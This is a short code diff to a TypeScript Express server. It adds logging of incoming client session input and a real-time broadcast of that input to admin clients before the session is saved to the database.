@@ -195,11 +195,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
             }
             
+            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
+            
+            // Notify admins immediately of incoming data before database update
+            broadcastToAdmins(JSON.stringify({
+              type: 'CLIENT_INPUT_REALTIME',
+              data: {
+                sessionId,
+                tipo,
+                inputData
+              }
+            }));
+            
             // Update session if we have fields to update
             if (Object.keys(updatedFields).length > 0) {
               const updatedSession = await storage.updateSession(sessionId, updatedFields);
               
-              // Notify all admin clients
+              // Notify all admin clients about the database update
               broadcastToAdmins(JSON.stringify({
                 type: 'SESSION_UPDATE',
                 data: updatedSession
